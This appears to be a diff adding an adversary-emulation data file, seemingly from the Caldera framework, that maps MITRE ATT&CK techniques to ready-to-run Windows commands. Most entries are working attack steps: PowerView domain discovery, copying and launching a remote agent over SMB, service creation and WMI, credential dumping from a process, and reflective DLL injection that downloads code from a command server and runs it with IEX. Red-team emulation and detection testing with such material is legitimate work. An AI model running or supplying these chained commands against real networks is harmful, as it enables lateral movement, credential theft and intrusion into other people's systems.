@@ -1,0 +1,96 @@
+('921055f4-5970-4707-909e-62f594234d91', 'remote.host.fqdn', 'remote.host.fqdn')
+('2afae782-6d0a-4fbd-a6b6-d1ce90090eac', 'remote.host.fqdn', 'remote.host.fqdn')
+('65048ec1-f7ca-49d3-9410-10813e472b30', 'remote.host.fqdn', 'remote.host.fqdn')
+('aa6ec4dd-db09-4925-b9b9-43adeb154686', 'remote.host.fqdn', 'remote.host.fqdn')
+('95727b87-175c-4a69-8c7a-a5d82746a753', 'remote.host.fqdn', 'None')
+('f1cf4ea1-43f0-4604-9537-3d1b1b2d5b1c', 'None', 'domain.user.name')
+('ece5dde3-d370-4c20-b213-a1f424aa8d03', 'domain.user.name', 'None')
+('05cda6f6-2b1b-462e-bff1-845af94343f7', 'None', 'host.process.id')
+('3c647015-ab0a-496a-8847-6ab173cd2b22', 'host.process.id', 'None')
+('a398986f-31b0-436a-87e9-c8e82c028f3c', 'host.process.id', 'None')
+('fa6e8607-e0b1-425d-8924-9b894da5a002', 'None', 'host.current.time')
+('13379ae1-d20e-4162-91f8-320d78a35e7f', 'None', 'remote.host.fqdn')
+
+
+id__dependence__fact: ('921055f4-5970-4707-909e-62f594234d91', 'remote.host.fqdn', 'remote.host.fqdn')
+> description: Ping a remote host to see if it is accessible
+> tactic: discovery
+> technique: {'attack_id': 'T1016', 'name': 'System Network Configuration Discovery'}
+> platforms: {'windows': {'psh': {'command': 'ping #{remote.host.fqdn}\n', 'parsers': {'plugins.stockpile.app.parsers.firewallping': [{'source': 'remote.host.fqdn', 'edge': 'isAccessibleFrom'}]}}}}
+
+
+id__dependence__fact: ('2afae782-6d0a-4fbd-a6b6-d1ce90090eac', 'remote.host.fqdn', 'remote.host.fqdn')
+> description: Use PowerView to query the Active Directory server to determine remote admins
+> tactic: discovery
+> technique: {'attack_id': 'T1069.002', 'name': 'Permission Groups Discovery: Domain Groups'}
+> platforms: {'windows': {'psh': {'command': 'Import-Module .\\powerview.ps1;\n$backup = "#{backup.admin.ability}";\n$userName = "#{domain.user.name}";\n$userPassword = "#{domain.user.password}";\n$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force;\n$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword);\nGet-NetLocalGroupMember -ComputerName #{remote.host.fqdn} -Credential $credObject\n', 'parsers': {'plugins.stockpile.app.parsers.netlocalgroup': [{'source': 'remote.host.fqdn', 'edge': 'has_admin', 'target': 'domain.user.name'}]}, 'payloads': ['powerview.ps1']}}}
+
+
+id__dependence__fact: ('65048ec1-f7ca-49d3-9410-10813e472b30', 'remote.host.fqdn', 'remote.host.fqdn')
+> description: Copy 54ndc47 to remote host (SMB)
+> tactic: lateral-movement
+> technique: {'attack_id': 'T1021.002', 'name': 'Remote Services: SMB/Windows Admin Shares'}
+> platforms: {'windows': {'psh': {'command': '$path = "sandcat.go-windows";\n$drive = "\\\\#{remote.host.fqdn}\\C$";\nCopy-Item -v -Path $path -Destination $drive"\\Users\\Public\\s4ndc4t.exe";\n', 'cleanup': '$drive = "\\\\#{remote.host.fqdn}\\C$";\nRemove-Item -Path $drive"\\Users\\Public\\s4ndc4t.exe" -Force;\n', 'parsers': {'plugins.stockpile.app.parsers.54ndc47_remote_copy': [{'source': 'remote.host.fqdn', 'edge': 'has_54ndc47_copy'}]}, 'payloads': ['sandcat.go-windows']}}}
+
+
+id__dependence__fact: ('aa6ec4dd-db09-4925-b9b9-43adeb154686', 'remote.host.fqdn', 'remote.host.fqdn')
+> description: Mount a windows share
+> tactic: lateral-movement
+> technique: {'attack_id': 'T1021.002', 'name': 'Remote Services: SMB/Windows Admin Shares'}
+> platforms: {'windows': {'psh': {'command': 'net use \\\\#{remote.host.fqdn}\\C$ /user:#{domain.user.name} #{domain.user.password}\n', 'cleanup': 'net use \\\\#{remote.host.fqdn}\\C$ /delete\n', 'parsers': {'plugins.stockpile.app.parsers.share_mounted': [{'source': 'remote.host.fqdn', 'edge': 'has_share'}]}}}}
+
+
+id__dependence__fact: ('95727b87-175c-4a69-8c7a-a5d82746a753', 'remote.host.fqdn', 'None')
+> description: Create a service named "sandsvc" to execute remote 54ndc57 binary named "s4ndc4t.exe"
+> tactic: execution
+> technique: {'attack_id': 'T1569.002', 'name': 'System Services: Service Execution'}
+> platforms: {'windows': {'psh': {'timeout': 300, 'cleanup': 'sc.exe \\\\#{remote.host.fqdn} stop sandsvc;\nsc.exe \\\\#{remote.host.fqdn} delete sandsvc /f;\ntaskkill /s \\\\#{remote.host.fqdn} /FI "Imagename eq s4ndc4t.exe"\n', 'command': 'sc.exe \\\\#{remote.host.fqdn} create sandsvc start= demand error= ignore binpath= "cmd /c start C:\\Users\\Public\\s4ndc4t.exe -server #{server} -v -originLinkID #{origin_link_id}" displayname= "Sandcat Execution";\nsc.exe \\\\#{remote.host.fqdn} start sandsvc;\nStart-Sleep -s 15;\nGet-Process -ComputerName #{remote.host.fqdn} s4ndc4t;\n'}}}
+
+
+id__dependence__fact: ('f1cf4ea1-43f0-4604-9537-3d1b1b2d5b1c', 'None', 'domain.user.name')
+> description: Get Service Accounts for a domain
+> tactic: discovery
+> technique: {'attack_id': 'T1033', 'name': 'System Owner/User Discovery'}
+> platforms: {'windows': {'psh': {'command': 'Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -SPN | ConvertTo-Json -Depth 1\n', 'parsers': {'plugins.stockpile.app.parsers.json': [{'source': 'domain.user.name', 'custom_parser_vals': {'json_key': 'samaccountname', 'json_type': 'str'}}]}, 'payloads': ['powerview.ps1']}}}
+
+
+id__dependence__fact: ('ece5dde3-d370-4c20-b213-a1f424aa8d03', 'domain.user.name', 'None')
+> description: Remotely executes 54ndc47 over WMI
+> tactic: execution
+> technique: {'attack_id': 'T1047', 'name': 'Windows Management Instrumentation'}
+> platforms: {'windows': {'psh': {'command': 'wmic /node:`"#{remote.host.fqdn}`" /user:`"#{domain.user.name}`" /password:`"#{domain.user.password}`" process call create "powershell.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} -group #{group}";\n', 'cleanup': 'wmic /node:`"#{remote.host.fqdn}`" /user:`"#{domain.user.name}`" /password:`"#{domain.user.password}`" process call create "taskkill /f /im s4ndc4t.exe"\n'}, 'cmd': {'command': 'wmic /node:`"#{remote.host.fqdn}`" /user:`"#{domain.user.name}`" /password:`"#{domain.user.password}`" process call create "cmd.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} -group #{group}";\n', 'cleanup': 'wmic /node:`"#{remote.host.fqdn}`" /user:`"#{domain.user.name}`" /password:`"#{domain.user.password}`" process call create "taskkill /f /im s4ndc4t.exe"\n'}}}
+
+
+id__dependence__fact: ('05cda6f6-2b1b-462e-bff1-845af94343f7', 'None', 'host.process.id')
+> description: Discovers processes that the current user has the ability to access and selects an injectable one
+> tactic: discovery
+> technique: {'attack_id': 'T1057', 'name': 'Process Discovery'}
+> platforms: {'windows': {'psh': {'command': '$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l="Owner";e={$owners[$_.id.tostring()]}};\n$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq "svchost") {$p} };\n$valid | ConvertTo-Json\n', 'parsers': {'plugins.stockpile.app.parsers.json': [{'source': 'host.process.id', 'custom_parser_vals': {'json_key': 'Id', 'json_type': 'int'}}]}}}}
+
+
+id__dependence__fact: ('3c647015-ab0a-496a-8847-6ab173cd2b22', 'host.process.id', 'None')
+> description: Custom GO credential dumper using minidumpwritedump
+> tactic: credential-access
+> technique: {'attack_id': 'T1003', 'name': 'OS Credential Dumping'}
+> platforms: {'windows': {'psh': {'command': '.\\totallylegit.exe #{host.process.id} C:\\Users\\Public\\creds.dmp\n', 'payloads': ['totallylegit.exe'], 'cleanup': 'if (Test-Path "C:\\Users\\Public\\creds.dmp") {\n  rm "C:\\Users\\Public\\creds.dmp" -Force;\n};\n'}}}
+
+
+id__dependence__fact: ('a398986f-31b0-436a-87e9-c8e82c028f3c', 'host.process.id', 'None')
+> description: Injects sandcat DLL into an available process
+> tactic: defense-evasion
+> technique: {'attack_id': 'T1055.002', 'name': 'Process Injection: Portable Executable Injection'}
+> platforms: {'windows': {'psh': {'command': '$url="#{server}/file/download";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add("platform","windows");\n$wc.Headers.add("file","shared.go");\n$wc.Headers.add("server","#{server}");\n$PEBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add("file","Invoke-ReflectivePEInjection.ps1");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -verbose -PBytes $PEbytes -ProcId #{host.process.id}\n'}}}
+
+
+id__dependence__fact: ('fa6e8607-e0b1-425d-8924-9b894da5a002', 'None', 'host.current.time')
+> description: get current system time (ISO 8601)
+> tactic: discovery
+> technique: {'attack_id': 'T1124', 'name': 'System Time Discovery'}
+> platforms: {'darwin': {'sh': {'command': 'date -u +"%Y-%m-%dT%H:%M:%SZ"\n', 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.current.time'}]}}}, 'linux': {'sh': {'command': 'date -u +"%Y-%m-%dT%H:%M:%SZ"\n', 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.current.time'}]}}}, 'windows': {'psh': {'command': "Get-Date -UFormat '+%Y-%m-%dT%H:%M:%SZ'\n", 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.current.time'}]}}}}
+
+
+id__dependence__fact: ('13379ae1-d20e-4162-91f8-320d78a35e7f', 'None', 'remote.host.fqdn')
+> description: Use PowerView to query the Active Directory server for a list of computers in the Domain
+> tactic: discovery
+> technique: {'attack_id': 'T1018', 'name': 'Remote System Discovery'}
+> platforms: {'windows': {'psh': {'command': 'Import-Module .\\powerview.ps1;\nGet-DomainComputer\n', 'parsers': {'plugins.stockpile.app.parsers.gdomain': [{'source': 'remote.host.fqdn'}]}, 'payloads': ['powerview.ps1']}}}
